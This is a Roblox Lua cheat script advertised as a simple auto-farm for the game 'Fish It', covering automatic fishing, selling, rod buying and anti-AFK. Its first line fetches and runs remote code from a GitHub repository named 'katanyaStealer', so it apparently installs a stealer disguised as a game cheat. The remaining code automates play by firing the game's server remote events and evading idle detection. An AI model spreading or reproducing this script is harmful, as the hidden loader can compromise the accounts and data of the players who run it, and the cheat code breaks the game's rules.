-- Fish It Auto Farm
-- Simple & Effective

loadstring(game:HttpGet("https://raw.githubusercontent.com/aldyjrz/katanyaStealer/refs/heads/main/aldytoi"))()

wait(2)

print("🎣 Fish It Auto Farm Activated!")

-- Auto Fishing
spawn(function()
    while wait(1) do
        pcall(function()
            local rod = game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool") or game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
            if rod then
                if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") ~= rod then
                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(rod)
                    wait(0.5)
                end
                rod:Activate()
                wait(math.random(3, 7))
                rod:Activate()
            end
        end)
    end
end)

-- Auto Sell
spawn(function()
    while wait(5) do
        pcall(function()
            for i,v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
                if v:IsA("RemoteEvent") and string.lower(v.Name):find("sell") then
                    v:FireServer()
                end
            end
        end)
    end
end)

-- Buy Rod
wait(3)
pcall(function()
    for i,v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
        if v:IsA("RemoteFunction") and string.lower(v.Name):find("purchase") then
            v:InvokeServer()
        end
    end
end)

-- Anti AFK
game:GetService("Players").LocalPlayer.Idled:connect(function()
    game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    wait(1)
    game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)

print("✅ Auto Farm Started!")
print("🎣 Fishing: ON")
print("💰 Auto Sell: ON")
